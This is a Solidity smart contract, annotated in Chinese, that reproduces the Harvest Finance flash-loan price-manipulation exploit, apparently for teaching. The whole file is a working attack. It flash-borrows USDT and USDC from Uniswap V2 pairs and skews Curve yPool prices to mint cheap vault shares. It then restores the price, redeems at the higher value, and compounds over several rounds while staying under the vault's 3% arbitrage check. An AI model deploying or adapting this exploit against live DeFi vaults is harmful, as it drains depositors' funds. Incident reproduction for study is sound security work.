// SPDX-License-Identifier: MIT
pragma solidity =0.8.10;

import "./interfaces/IERC20Like.sol";
import "./interfaces/IUniswapV2PairLike.sol";
import "./interfaces/ICurveYPoolLike.sol";
import "./interfaces/IHarvestVaultLike.sol";
import "./libraries/FlashFee.sol";

/// @title Harvest Finance 闪电贷 + 预言机操纵攻击合约（教学复现用）
/// @notice 攻击机理：
///   1. 从 Uniswap V2 交易对闪电借出「倾斜币」（tilt，本复现为 USDT），
///      再嵌套从另一个交易对闪电借出「本金币」（want，本复现为 USDC）；
///   2. 把借来的 tilt 全部砸进 Curve yPool，使池内 want 储备上升、tilt 储备下降，
///      get_virtual_price() 随之下移；
///   3. Harvest 金库的份额定价依赖策略报告的本金价值，而策略按 yToken 的
///      getPricePerFullShare()（由 yPool virtual price 决定）计价，于是份额价格被压低，
///      同一笔 want 能换到更多份额；
///   4. 把剩余 want 反向砸回 yPool 复位价格，再按复位后的高价赎回全部份额；
///   5. 归还两笔闪电贷，差额即利润。
/// @dev 硬约束：Harvest 金库 _deposit() 内部 require(strategy.depositArbCheck())，
///      价格操纵幅度必须 < 约 3%，否则 revert（"Too much arb"）。
contract HarvestAttacker {
    struct Cfg {
        address vault;      // Harvest 金库（同时也是份额代币）地址
        address want;       // 进入金库的本金币（fUSDC 金库 -> USDC）
        address tilt;       // 只用于倾斜价格的币（fUSDC 金库 -> USDT）
        address pairWant;   // want/WETH 的 Uniswap V2 交易对（闪电借 want）
        address pairTilt;   // tilt/WETH 的 Uniswap V2 交易对（闪电借 tilt）
        address curvePool;  // Curve yPool
        int128 idxWant;     // want 在 yPool 中的币序
        int128 idxTilt;     // tilt 在 yPool 中的币序
    }

    struct Params {
        uint256 borrowTilt;    // 从 pairTilt 借出的 tilt 数量（真实攻击为 18,308,555.417594 USDT）
        uint256 tiltAmount;    // 其中真正砸进 yPool 的数量（真实攻击为 17,222,012.640506 USDT）
        uint256 borrowWant;    // 从 pairWant 借出的 want 数量（50,000,000 USDC）
        uint256 depositAmount; // 首轮存入金库的 want 数量，剩余 want 固定用于回拉价格
        uint256 rounds;        // 复利轮数（真实交易 1 笔交易内跑了 3 轮）
    }

    struct Report {
        uint256 profit;    // 净利（want 数量）
        uint256 shares;    // 最后一轮铸造的份额
        uint256 deposited; // 最后一轮存入的 want
        uint256 redeemed;  // 最后一轮赎回得到的 want
    }

    Cfg private cfg;
    uint256 private tiltBorrowed;
    uint256 private tiltToDump;
    uint256 private wantBorrowed;
    uint256 private depositAmount;
    uint256 private tiltOwed;
    uint256 private wantOwed;
    uint256 private rounds_;
    bool private busy;

    bool public priceRestored;
    uint256 public sharesMinted;
    uint256 public wantDeposited;
    uint256 public wantRedeemed;
    uint256 public profitWant;

    event Tilted(uint256 tiltIn, uint256 wantOut);
    event Deposited(uint256 wantIn, uint256 sharesOut);
    event Restored(uint256 wantIn, uint256 tiltOut);
    event Redeemed(uint256 sharesIn, uint256 wantOut);
    event Repaid(address indexed pair, address indexed token, uint256 amount);
    event Profit(address indexed token, uint256 amount);

    error NotPair(address caller);
    error ArbGateClosed();
    error BadStage(uint8 stage);
    error TransferFailed(address token, address to, uint256 amount);
    error Reentered();
    error InsufficientWant(uint256 have, uint256 need);
    error UnexpectedBorrow(uint256 expected, uint256 actual);

    /// @notice 攻击入口
    /// @return rep 复现报告：净利、末轮份额、末轮存入额、末轮赎回额
    function attack(Cfg calldata c, Params calldata p) external returns (Report memory rep) {
        if (busy) revert Reentered();
        busy = true;

        require(p.tiltAmount <= p.borrowTilt, "tilt > borrow");
        require(p.rounds >= 1, "rounds = 0");
        cfg = c;
        rounds_ = p.rounds;
        tiltBorrowed = p.borrowTilt;
        tiltToDump = p.tiltAmount;
        wantBorrowed = p.borrowWant;
        depositAmount = p.depositAmount;
        tiltOwed = FlashFee.owed(p.borrowTilt);
        wantOwed = FlashFee.owed(p.borrowWant);
        priceRestored = false;
        sharesMinted = 0;
        wantDeposited = 0;
        wantRedeemed = 0;
        profitWant = 0;

        require(IHarvestVaultLike(c.vault).underlying() == c.want, "underlying mismatch");
        require(ICurveYPoolLike(c.curvePool).coins(c.idxWant) != address(0), "bad curve index");

        uint256 amount0Out;
        uint256 amount1Out;
        if (IUniswapV2PairLike(c.pairTilt).token1() == c.tilt) {
            amount1Out = p.borrowTilt;
        } else {
            require(IUniswapV2PairLike(c.pairTilt).token0() == c.tilt, "tilt not in pair");
            amount0Out = p.borrowTilt;
        }

        // 外层闪电兑换：借 tilt，回调进入 stage 1
        IUniswapV2PairLike(c.pairTilt).swap(amount0Out, amount1Out, address(this), abi.encode(uint8(1)));

        rep.profit = IERC20Like(c.want).balanceOf(address(this));
        rep.shares = sharesMinted;
        rep.deposited = wantDeposited;
        rep.redeemed = wantRedeemed;
        profitWant = rep.profit;
        busy = false;
        emit Profit(c.want, rep.profit);
    }

    /// @notice Uniswap V2 闪电兑换回调（签名固定）
    function uniswapV2Call(address, uint256 amount0, uint256 amount1, bytes calldata data) external {
        uint8 stage = abi.decode(data, (uint8));
        Cfg memory c = cfg;

        if (stage == 1) {
            if (msg.sender != c.pairTilt) revert NotPair(msg.sender);
            _onTiltBorrowed(c, amount0, amount1);
        } else if (stage == 2) {
            if (msg.sender != c.pairWant) revert NotPair(msg.sender);
            _onWantBorrowed(c, amount0, amount1);
        } else {
            revert BadStage(stage);
        }
    }

    /// @dev 第一层回调：手里拿着借来的 tilt
    function _onTiltBorrowed(Cfg memory c, uint256 amount0, uint256 amount1) internal {
        uint256 borrowed = IUniswapV2PairLike(c.pairTilt).token1() == c.tilt ? amount1 : amount0;
        if (borrowed != tiltBorrowed) revert UnexpectedBorrow(tiltBorrowed, borrowed);

        _tilt(c);
        _borrowWant(c);

        // 归还 tilt 闪电贷（0.3% 手续费，向上取整）
        _safeTransfer(c.tilt, msg.sender, tiltOwed);
        emit Repaid(msg.sender, c.tilt, tiltOwed);
    }

    /// @dev 全部 tilt 砸进 yPool：tilt -> want，压低 virtual price
    function _tilt(Cfg memory c) internal {
        uint256 amount = tiltToDump;
        uint256 before = IERC20Like(c.want).balanceOf(address(this));
        _safeApprove(c.tilt, c.curvePool, amount);
        ICurveYPoolLike(c.curvePool).exchange_underlying(c.idxTilt, c.idxWant, amount, 0);
        emit Tilted(amount, IERC20Like(c.want).balanceOf(address(this)) - before);
    }

    /// @dev 嵌套第二层闪电兑换：借 want（真正的本金）
    function _borrowWant(Cfg memory c) internal {
        uint256 out0;
        uint256 out1;
        if (IUniswapV2PairLike(c.pairWant).token0() == c.want) {
            out0 = wantBorrowed;
        } else {
            require(IUniswapV2PairLike(c.pairWant).token1() == c.want, "want not in pair");
            out1 = wantBorrowed;
        }
        IUniswapV2PairLike(c.pairWant).swap(out0, out1, address(this), abi.encode(uint8(2)));
    }

    /// @dev 第二层回调：手里同时有借来的 want 与砸盘换来的 want
    ///      真实攻击在这一层用复利跑了 3 轮（每轮：砸盘 -> 存入 -> 回拉 -> 赎回），
    ///      每轮的回拉额固定，存入额 = 当前 want 余额 - 回拉额，利润滚动复投。
    function _onWantBorrowed(Cfg memory c, uint256 amount0, uint256 amount1) internal {
        uint256 borrowed = IUniswapV2PairLike(c.pairWant).token0() == c.want ? amount0 : amount1;
        if (borrowed != wantBorrowed) revert UnexpectedBorrow(wantBorrowed, borrowed);

        uint256 wantBal = IERC20Like(c.want).balanceOf(address(this));
        if (wantBal < depositAmount) revert InsufficientWant(wantBal, depositAmount);
        uint256 reverseAmount = wantBal - depositAmount;

        for (uint256 r = 0; r < rounds_; r++) {
            if (r > 0) _tilt(c);

            uint256 bal = IERC20Like(c.want).balanceOf(address(this));
            uint256 shares = _deposit(c, bal - reverseAmount);
            _restore(c, reverseAmount);
            _redeem(c, shares);
        }

        // 归还 want 闪电贷
        _safeTransfer(c.want, msg.sender, wantOwed);
        emit Repaid(msg.sender, c.want, wantOwed);

        // 单轮攻击中 tilt 腿为净支出，用 want 利润补足缺口
        _topUpTilt(c);
    }

    /// @dev 低价存入：先过 3% 套利闸门，再用同一笔 want 换到更多份额
    function _deposit(Cfg memory c, uint256 amount) internal returns (uint256 shares) {
        uint256 bal = IERC20Like(c.want).balanceOf(address(this));
        if (bal < amount) revert InsufficientWant(bal, amount);

        address strategy = IHarvestVaultLike(c.vault).strategy();
        if (!IHarvestStrategyLike(strategy).depositArbCheck()) revert ArbGateClosed();

        _safeApprove(c.want, c.vault, amount);
        uint256 before = IHarvestVaultLike(c.vault).balanceOf(address(this));
        IHarvestVaultLike(c.vault).deposit(amount);
        shares = IHarvestVaultLike(c.vault).balanceOf(address(this)) - before;

        sharesMinted = shares;
        wantDeposited = amount;
        emit Deposited(amount, shares);
    }

    /// @dev 反向砸盘复位价格
    function _restore(Cfg memory c, uint256 amount) internal {
        uint256 before = IERC20Like(c.tilt).balanceOf(address(this));
        _safeApprove(c.want, c.curvePool, amount);
        ICurveYPoolLike(c.curvePool).exchange_underlying(c.idxWant, c.idxTilt, amount, 0);
        priceRestored = true;
        emit Restored(amount, IERC20Like(c.tilt).balanceOf(address(this)) - before);
    }

    /// @dev 按复位后的价格赎回份额
    function _redeem(Cfg memory c, uint256 shares) internal {
        uint256 beforeRedeem = IERC20Like(c.want).balanceOf(address(this));
        IHarvestVaultLike(c.vault).withdraw(shares);
        wantRedeemed = IERC20Like(c.want).balanceOf(address(this)) - beforeRedeem;
        emit Redeemed(shares, wantRedeemed);
    }

    /// @dev 单轮攻击里 USDT 腿是净支出，用 want 利润换回 tilt 补足还款缺口
    function _topUpTilt(Cfg memory c) internal {
        uint256 tiltBal = IERC20Like(c.tilt).balanceOf(address(this));
        if (tiltBal >= tiltOwed) return;

        uint256 need = ((tiltOwed - tiltBal) * 1002) / 1000 + 1;
        uint256 have = IERC20Like(c.want).balanceOf(address(this));
        if (have <= need) return;

        _safeApprove(c.want, c.curvePool, need);
        ICurveYPoolLike(c.curvePool).exchange_underlying(c.idxWant, c.idxTilt, need, 0);
    }

    // ---------------- 内部工具 ----------------

    function _safeApprove(address token, address spender, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.approve.selector, spender, amount));
        if (!ok || (ret.length != 0 && !abi.decode(ret, (bool)))) revert TransferFailed(token, spender, amount);
    }

    function _safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory ret) = token.call(abi.encodeWithSelector(IERC20Like.transfer.selector, to, amount));
        if (!ok || (ret.length != 0 && !abi.decode(ret, (bool)))) revert TransferFailed(token, to, amount);
    }
}
